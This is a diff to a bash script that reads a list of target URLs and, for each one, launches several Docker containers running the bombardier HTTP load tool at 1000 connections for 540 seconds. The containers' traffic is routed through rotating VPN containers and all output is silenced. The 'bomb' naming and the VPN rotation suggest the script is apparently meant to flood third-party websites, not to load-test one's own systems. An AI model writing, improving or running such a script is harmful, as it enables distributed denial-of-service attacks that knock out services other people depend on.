@@ -8,7 +8,7 @@ TTL=$5
 
 LOOP_COUNT=1
 STEPS=$(expr $TTL / 30)
-NUM_VPN=6
+NUM_VPN=4
 CUR=1
 echo "$STEPS"
 
@@ -40,26 +40,20 @@ do
    IFS=$'\n' read -d '' -r -a linesbomb < $RESOURCES_FILE_BOMB
    for BOMB in "${linesbomb[@]}"
    do
-      NAME_BASE=$(sed 's+https://++g' <<<"$BOMB")
-      NAME_BASE=$(sed 's+http://++g' <<<"$NAME_BASE")
-      NAME_BASE=$(sed 's+/++g' <<<"$NAME_BASE")
-      NAME_BASE=$(sed 's+\.+_+g' <<<"$NAME_BASE")
+      if [ $CUR -gt $NUM_VPN ]
+      then
+         CUR=1
+      fi
+      TAR_VPN="app"$CUR"_vpn_1"
+      echo "Starting for $BOMB. using VPN: $TAR_VPN"
 
       for (( c=1; c<=$INSTANCE_PER_BOMB; c++ ))
       do
          {
-            if [ $CUR -gt $NUM_VPN ]
-            then
-               CUR=1
-            fi
-            TAR_VPN="app"$CUR"_vpn_1"
-            echo "Starting for $BOMB. using VPN: $TAR_VPN"
-
-            NAME="VPN""$CUR""_""$NAME_BASE""$c"
-            sudo docker run --name $NAME -d -m 128m --cpu-quota=90000 --rm --net=container:$TAR_VPN alpine/bombardier -c 1000 -d 540 $BOMB
-            CUR=$(expr $CUR + 1)
+            sudo docker run -d -m 128m --cpus=2 --rm --net=container:$TAR_VPN alpine/bombardier -c 1000 -d 540s -l $BOMB
          } &> /dev/null
       done
+      CUR=$(expr $CUR + 1)
    done
    echo "Bombardier instances started."
 
